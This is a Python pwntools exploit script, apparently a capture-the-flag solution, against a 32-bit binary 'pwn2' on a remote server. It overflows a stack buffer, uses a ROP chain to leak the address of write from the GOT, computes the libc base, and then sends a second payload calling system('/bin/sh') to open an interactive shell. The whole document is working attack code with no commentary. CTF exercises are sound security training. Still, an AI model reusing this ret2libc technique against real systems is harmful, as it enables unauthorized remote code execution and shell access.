from pwn import *

# p = process('./pwn2', env={"LD_PRELOAD":"./libc6-i386_2.23-0ubuntu11.2_amd64.so"})
p = remote('34.64.159.111', 12768)
e = ELF('./pwn2')
l = ELF('./libc6-i386_2.23-0ubuntu11.2_amd64.so')

sh = l.search('/bin/sh').next()
pppr = 0x80486f9
pr = 0x80486fb

payload = 'A'*0x24 + 'AAAA'
payload += p32(e.plt['write'])
payload += p32(pppr)
payload += p32(1)
payload += p32(e.got['write'])
payload += p32(8)

# payload += p32(e.plt['read'])
# payload += p32(pppr)
# payload += p32(0)
# payload += p32(e.bss()+0x10)
# payload += p32(8)
payload += p32(e.symbols['main'])

p.sendafter('MSG : \n', payload)
base = u32(p.recv(4)) - l.symbols['write']
print hex(base)
sleep(0.3)
# p.send('/bin/sh/\x00')
sh = base + sh
system = base + l.symbols['system']
payload = 'A'*0x24 + 'AAAA'
payload += p32(system)
payload += p32(pr)
payload += p32(sh)

p.sendafter('MSG : \n', payload)
p.interactive()